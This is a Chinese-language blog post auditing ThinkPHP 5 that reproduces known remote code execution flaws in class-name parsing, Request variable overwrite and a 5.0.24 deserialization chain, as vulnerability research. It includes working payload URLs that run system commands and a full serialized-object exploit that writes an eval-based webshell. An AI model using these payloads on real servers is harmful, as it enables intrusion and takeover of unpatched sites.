---
title: "thinkphp5代码审计"
date: 2021-03-12
draft: false
image: https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210312152311.jpeg
description: 
categories: 
- note
tags:
- 代码审计
---

本篇博文会复现大多数tp5的漏洞，持续更新

## 审计环境搭建

### 安装thinkphp

推荐使用composer，版本切换很方便

```
composer create-project --prefer-dist topthink/think=5.0.10 tp5.0.10
```

将 composer.json 文件的 require 字段设置成如下：

```
"require": {
    "php": ">=5.4.0",
    "topthink/framework": "5.0.10"
},
```

然后执行 `composer update`

### PhpStorm+Xdebug调试环境

可以看我另外一篇文章：[Debian下PHP Xdebug调试环境搭建](https://anthem-whisper.github.io/p/debian下php-xdebug调试环境搭建/)

另外VSCode+Xdebug也是一个不错且方便的选择

## 框架基本流程

框架基本流程网上都讲的很清楚，我这里就不搬运了

这两篇文章讲的很不错：

https://paper.seebug.org/888/#_4

https://xz.aliyun.com/t/8143

## RCE-类名解析导致任意类方法调用

> ThinkPHP版本：5.0.7<=5.0.x<=5.0.22 、5.1.0<=5.1.x<=5.1.30
>
> 参考：
>
> https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C9.md
>
> https://paper.seebug.org/888/#poc
>
> https://xz.aliyun.com/t/3570

### 概述

本次漏洞存在于 **ThinkPHP** 底层没有对控制器名进行很好的合法性校验，导致在未开启强制路由的情况下，用户可以调用任意类的任意方法，最终导致 **远程代码执行漏洞** 的产生。漏洞影响版本： **5.0.7<=ThinkPHP5<=5.0.22** 、**5.1.0<=ThinkPHP<=5.1.30**。不同版本 **payload** 需稍作调整：

**5.1.x** ：

```
?s=index/\think\Request/input&filter[]=system&data=pwd
?s=index/\think\view\driver\Php/display&content=<?php phpinfo();?>
?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=<?php phpinfo();?>
?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
```

**5.0.x** ：

```
?s=index/think\config/get&name=database.username # 获取配置信息
?s=index/\think\Lang/load&file=../../test.jpg    # 包含任意文件
?s=index/\think\Config/load&file=../../t.php     # 包含任意.php文件
?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
```

### 5.1.x类名解析

2018年12月9日官方发布的补丁，在library/think/route/dispatch/Module.php获取控制器名处加了个一个正则waf

![](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210312150300.png)

洞其实不在这里

在路由调度的时候：

![image-20210224183737791](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210312150307.png)

跟进到thinkphp/library/think/route/dispatch/Module.php:

![image-20210224183857202](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210312150311.png)

跟进controller方法：(thinkphp/library/think/App.php)

![image-20210224193234503](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210312150328.png)

跟进parseModuleAndClass方法：(thinkphp/library/think/App.php)

![image-20210222221052520](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210312150405.png)

这个方法先对`$name`(类名)进行判断，当`$name`含有`\`时会直接将其作为类的命名空间路径，导致我们可以任意方法调用，比如：

* thinkphp/library/think/Container.php：

![image-20210223112805010](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210312150430.png)

```
http://127.0.0.1/public/index.php?s=index/think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
```

通过自动加载的特性，`think\Container`可以直接调用thinkphp/library/think/Container.php的危险方法`invokefunction`，造成RCE。

* thinkphp/library/think/Request.php:

![image-20210223113330871](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210312150418.png)

因为是private，所以查找同一类里面的用例：

1. Request::input方法：

![image-20210223113649493](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210312150443.png)

构造poc：

```
http://127.0.0.1/public/index.php?s=index/think\request/input&data=1&filter=phpinfo&name=
```

2. Request::cookie方法：

![image-20210223114040419](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210312150457.png)

构造poc：

 ```
http://127.0.0.1/public/?s=index/think\request/cookie&name=cmd&filter=phpinfo
[HTTP header]
Cookie: cmd=1
 ```

同样成功RCE。

* thinkphp/library/think/template/driver/File.php:

![image-20210223130238959](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210312150511.png)

构造poc：

```
http://127.0.0.1/public/?s=index/think\template\driver\file/write&cacheFile=/tmp/test.txt&content=hacked
```

成功写入/tmp/test.txt文件。

### 5.0.x类名解析

thinkphp/library/think/Loader.php:

![image-20210224104838156](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210312150528.png)

原理类似，在`App::run()`方法里面，`Loader::controller`进行调度的时候，当`$name`含有`\`时会直接将其作为类的命名空间路径，导致我们可以任意方法调用。比如：

* thinkphp/library/think/App.php:

![image-20210224111256654](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210312150543.png)

构造poc:

```
http://127.0.0.1/public/?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo()
http://127.0.0.1/public/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
```

eval因为不是函数不能直接回调，在特定php版本情况下可以使用assert直接RCE，或者利用其他函数读写文件。

### 需要注意的问题

在https://xz.aliyun.com/t/3570#toc-3这篇文章里面提到：

>因为默认配置会判断是否自动转换控制器，将控制器名变成小写
>
>又因为`Loader.php::autoloadwin`在win环境下严格区分大小写，所以导致有些类加载不到

但是我在Kali下经过小写转换同样也没办法加载到，可能是因为Linux本来就区分大小写？

如此一来，着手点只有框架在加载的时候就已经加载的类了

## RCE-Request核心类变量覆盖

> ThinkPHP版本：5.0.0<=ThinkPHP5<=5.0.23 、5.1.0<=ThinkPHP<=5.1.30
>
> 参考：
>
> https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C10.md

### 概述

![](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210416105559.png)

Request核心类**$method** 来自可控的 **$_POST** 数组，而且在获取之后没有进行任何检查，直接把它作为 **Request** 类的方法进行调用，同时，该方法传入的参数是可控数据 **$_POST** 。导致可以随意调用 **Request** 类的部分方法

payload：

```
http://php.local/thinkphp5.0.5/public/index.php?s=index
post
_method=__construct&method=get&filter[]=call_user_func&get[]=phpinfo
_method=__construct&filter[]=system&method=GET&get[]=whoami

# ThinkPHP <= 5.0.13
POST /?s=index/index
s=whoami&_method=__construct&method=&filter[]=system

# ThinkPHP <= 5.0.23、5.1.0 <= 5.1.16 需要开启框架app_debug
POST /
_method=__construct&filter[]=system&server[REQUEST_METHOD]=ls -al

# ThinkPHP <= 5.0.23 需要存在xxx的method路由，例如captcha
POST /?s=xxx HTTP/1.1
_method=__construct&filter[]=system&method=get&get[]=ls+-al
_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=ls
```

### 5.0.10变量覆盖

测试用的payload（版本5.0.10）：

```
http://127.0.0.1/public/index.php?s=index
POST:
_method=__construct&filter[]=system&method=get&get[]=whoami
```

在App::run()方法进行路由检测的时候，在Route.php大约843行调用`$request->method()`方法

thinkphp/library/think/Request.php:

![image-20210308164140184](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210312150559.png)

可以看到有一个可以控制的函数名`$_POST[Config::get['var_method']`，而`var_method`的值在application/config.php里面为`_method`:

![image-20210308164849228](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210312150613.png)

于是可以POST传入`_method`改变`$this->{$this->method}($_POST);`达到任意调用此类中的方法

而如果调用此类中的`__construct`方法：
![image-20210308165349746](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210312150623.png)

有一个foreach，可以引起POST数据对Requests对象属性的变量覆盖。

在App::run()方法里面，如果我们开启了debug模式，则会调用Request::param()方法：

![image-20210309112057671](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210312150633.png)

当然，即使没有开启debug，在App::run()里面的调用的exec方法同样也会调用Request::param()方法

![image-20210309115557269](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210312150643.png)

因为调用栈太深，就不一个个跟了

![image-20210309115705097](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210312150651.png)

这个方法我们需要特别关注了，因为 **Request** 类中的 `param、route、get、post、put、delete、patch、request、session、server、env、cookie、input` 方法均调用了 **filterValue** 方法，而该方法中就存在可利用的 **call_user_func** 函数

![image-20210309113026498](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210312150703.png)

### 小结

不同的payload触发流程不一样，但是核心是一样的。

任意方法调用发生在method()，变量覆盖发生在__construct()，rce发生在filterValue()

![](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210312150713.png)





## 5.0.24反序列化利用链

反序列化复现首先需要自己构造一个反序列化触发点：

![image-20210417135947010](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210417135956.png)

	### Windows类-任意文件删除

在thinkphp/library/think/process/pipes/Windows.php:

```php
class Windows extends Pipes
{
    private $files = [];
    ……
    private function removeFiles()
    {
        foreach ($this->files as $filename) {
            if (file_exists($filename)) {
                @unlink($filename);
            }
        }
        $this->files = [];
    }
    ……
    public function __destruct()
    {
        $this->close();
        $this->removeFiles();
    }   
}
```

由于`$this->files`可控，我们可以利用其实现任意文件删除

poc：

```php
<?php
namespace think\process\pipes;

class Pipes{

}

class Windows extends Pipes
{
    private $files = [];

    public function __construct()
    {
        $this->files=['D:\tmp\1.txt'];
    }
}

echo base64_encode(serialize(new Windows()));
```

只需要一个反序列化触发点，就可以实现任意文件删除。



### Output类`__call`方法任意文件写

>  Thinkphp 5.0.x反序列化最后触发RCE，本来要调用的`Request`类`__call`方法.
>
> 参考：
>
> https://xz.aliyun.com/t/8143#toc-10
>
> https://www.anquanke.com/post/id/196364#h2-2
>
> http://althims.com/2020/02/07/thinkphp-5-0-24-unserialize/
>
> https://www.anquanke.com/post/id/219327

还是从Windows类的`__destruct`入手

在上述Windows类的`removeFiles()`中使用了`file_exists()`函数，这个函数会把`$filename`当作字符串处理

![image-20210417144037447](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210417144045.png)

利用这一点，我们可以传入一个对象来触发`__toString`方法，于是全局搜索`__toString`

![image-20210417194627181](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210417202754.png)

可以看到他调用了`toJson`方法，因为`class Model`是一个抽象类，不能直接调用，所以我们目光移到子类里面

可以通过thinkphp/library/think/model/Pivot.php这个里面的类进行调用

跟进`toJson`方法：

```php
class Model
{
    ……
    public function toJson($options = JSON_UNESCAPED_UNICODE)
    {
        return json_encode($this->toArray(), $options);
    }
    ……
}
```

调用了`$this->toArray`，跟进`toArray`方法：

```php
class Model
{
    ……
    public function toArray()
    {
        $item    = [];
        $visible = [];
        $hidden  = [];

        $data = array_merge($this->data, $this->relation);

        // 过滤属性
        if (!empty($this->visible)) {
            $array = $this->parseAttr($this->visible, $visible);
            $data  = array_intersect_key($data, array_flip($array));
        } elseif (!empty($this->hidden)) {
            $array = $this->parseAttr($this->hidden, $hidden, false);
            $data  = array_diff_key($data, array_flip($array));
        }

        foreach ($data as $key => $val) {
            if ($val instanceof Model || $val instanceof ModelCollection) {
                // 关联模型对象
                $item[$key] = $this->subToArray($val, $visible, $hidden, $key);
            } elseif (is_array($val) && reset($val) instanceof Model) {
                // 关联模型数据集
                $arr = [];
                foreach ($val as $k => $value) {
                    $arr[$k] = $this->subToArray($value, $visible, $hidden, $key);
                }
                $item[$key] = $arr;
            } else {
                // 模型属性
                $item[$key] = $this->getAttr($key);
            }
        }
    ……
}
```

因为最终要触发`__call`，我们需要找到函数调用的地方，在toArray里面有这几处：

![image-20210417202816283](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210417211525.png)

经过调试过后选择最后一处`$item[$key] = $value ? $value->getAttr($attr) : null`

要进入到这一处要满足的条件是：

```php
1.if (!empty($this->append))//$this->append可控，后面把他设置为'getError'
2.if (method_exists($this, $relation))//$this->append可控，导致$relation可控
3.if (method_exists($modelRelation, 'getBindAttr'))//后面说
4.if ($bindAttr)//后面说
```

且不满足

```php
if (is_array($name))
elseif (strpos($name, '.'))
if (isset($this->data[$key]))
```

其中`$value`是由这两行确定的：	

![](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210417212035.png)

需要满足`$modelRelation`可控，经过查找，可以将`$relation`设为'getError'，`$modelRelation`就变成了`$this->getError()`的返回值：

```php
public function getError()
{
    return $this->error;//$this->error可控，他决定了$modelRelation的值
}
```

跟进getRelationDate:

![](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210417222219.png)

这里又给我们增加了条件：

- 5.最后传入的`$modelRelation`需要是`Relation`类型

- 6.最后返回值`$values`需要经过`if`语句判断`$this->parent && !$modelRelation->isSelfRelation() && get_class($modelRelation->getModel()) == get_class($this->parent)`才能让`$value`可控

  > 这里有两条路，一种是符合if判断直接返回，另一种是不满足，进而调用getRelation方法
  >
  > 具体可参考https://www.anquanke.com/post/id/219327

第二条路全局查找getRelation方法且为Relation子类的类，找到了HasOne（/thinkphp/library/think/model/relation/HasOne.php）

![](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210418113603.png)

第一条路，符合if判断之后`$value`可控，得到返回值`$values`之后代码跳出getRelationDate方法，运行至条件3处

![](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210418110614.png)

`if (method_exists($modelRelation, 'getBindAttr'))`，发现在HasOne的父类OneToOne里面是可控的：

![](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210417212650.png)

那么条件4也得到了解决。代码执行到了`$item[$key] = $value ? $value->getAttr($attr) : null`

控制`$value`就能调用`__call`方法；

之前我们有提到要RCE需要调用Request类的`__call`方法，但是由于`self::$hook[$method]`不可控,无法成功利用

![](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210418141551.png)

于是我们可以寻找其他的方法，比如Output类的`__call`方法

![](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210418143247.png)

这里调用了block方法，跟进：

![](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210418143440.png)

继续跟进：

![](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210418143521.png)

疯狂跟进：

![](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210418143650.png)

`$this->handle`是可控的，继续全局搜索write，寻找可控的点，找到了/thinkphp/library/think/session/driver/Memcached.php

![](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210418143918.png)

同样`$this->handle`可控，继续全局搜索set，找到thinkphp/library/think/cache/driver/File.php

![](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210418144434.png)

可以`file_put_contents`写shell，并且`$filename`在getCacheKey方法当中是可控的，伪协议绕一下exit就可以了

![](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210418145126.png)

但是`$data`比较麻烦，他从传入的`$value`取值，`set`方法中的参数来自先前调用的`write`方法，`write`之前在writeln的时候就传入了true，不可控。偷一张图：

![](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210418145636.png)

继续跟进后面的setTagItem方法，我们可以看到它再次调用了set方法:

![](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210418145844.png)

且文件内容`$value`通过`$name`赋值(文件名)，所以我们可以在文件名上面下功夫，比如`php://filter/write=string.rot13/resource=./<?cuc cucvasb();?>`这种

exp，可以实现在Windows写文件（来自网络）：

```php
<?php
namespace think\process\pipes {
    class Windows {
        private $files = [];

        public function __construct($files)
        {
            $this->files = [$files]; //$file => /think/Model的子类new Pivot(); Model是抽象类
        }
    }
}

namespace think {
    abstract class Model{
        protected $append = [];
        protected $error = null;
        public $parent;

        function __construct($output, $modelRelation)
        {
            $this->parent = $output;  //$this->parent=> think\console\Output;
            $this->append = array("xxx"=>"getError");     //调用getError 返回this->error
            $this->error = $modelRelation;               // $this->error 要为 relation类的子类，并且也是OnetoOne类的子类==>>HasOne
        }
    }
}

namespace think\model{
    use think\Model;
    class Pivot extends Model{
        function __construct($output, $modelRelation)
        {
            parent::__construct($output, $modelRelation);
        }
    }
}

namespace think\model\relation{
    class HasOne extends OneToOne {

    }
}
namespace think\model\relation {
    abstract class OneToOne
    {
        protected $selfRelation;
        protected $bindAttr = [];
        protected $query;
        function __construct($query)
        {
            $this->selfRelation = 0;
            $this->query = $query;    //$query指向Query
            $this->bindAttr = ['xxx'];// $value值，作为call函数引用的第二变量
        }
    }
}

namespace think\db {
    class Query {
        protected $model;

        function __construct($model)
        {
            $this->model = $model; //$this->model=> think\console\Output;
        }
    }
}
namespace think\console{
    class Output{
        private $handle;
        protected $styles;
        function __construct($handle)
        {
            $this->styles = ['getAttr'];
            $this->handle =$handle; //$handle->think\session\driver\Memcached
        }

    }
}
namespace think\session\driver {
    class Memcached
    {
        protected $handler;

        function __construct($handle)
        {
            $this->handler = $handle; //$handle->think\cache\driver\File
        }
    }
}

namespace think\cache\driver {
    class File
    {
        protected $options=null;
        protected $tag;

        function __construct(){
            $this->options=[
                'expire' => 3600, 
                'cache_subdir' => false, 
                'prefix' => '', 
                'path'  => 'php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php',
                'data_compress' => false,
            ];
            $this->tag = 'xxx';
        }

    }
}

namespace {
    $Memcached = new think\session\driver\Memcached(new \think\cache\driver\File());
    $Output = new think\console\Output($Memcached);
    $model = new think\db\Query($Output);
    $HasOne = new think\model\relation\HasOne($model);
    $window = new think\process\pipes\Windows(new think\model\Pivot($Output,$HasOne));
    echo serialize($window);
    echo base64_encode(serialize($window));
}
```

### 小结

在挖掘这种大型框架的反序列化链子的时候，代码量巨大，我们要在其中寻找：

- 危险函数（回调，读写文件，命令执行等）
- 同名方法（往往可以作为跳板）
- 可控参数（越多越好）

另外有一篇文章总结的挺不错https://xz.aliyun.com/t/8082

